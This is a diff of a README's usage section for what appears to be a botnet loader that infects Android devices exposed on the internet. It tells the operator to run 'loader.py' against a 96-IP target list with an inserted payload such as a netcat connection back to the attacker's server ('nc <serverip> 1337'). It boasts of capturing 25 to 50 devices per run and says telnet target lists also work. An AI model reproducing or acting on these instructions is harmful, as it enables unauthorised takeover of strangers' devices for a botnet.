@@ -37,10 +37,7 @@ gcc -o client client.c
 ```
 
 ## Usage
-After you have authenticated and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices.
-```
-
-```
+After you have authenticated with the botnet and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices. Please remember, you don't have to limit yourself to only android devices, if you want to use a telnet list, it will also work.
 
 ## Screenshots
 ![Screenshot_2021-08-21-05-36-18_922x559](https://user-images.githubusercontent.com/86132648/130317740-f9882527-6632-4529-b776-dd224e7bc6ef.png)
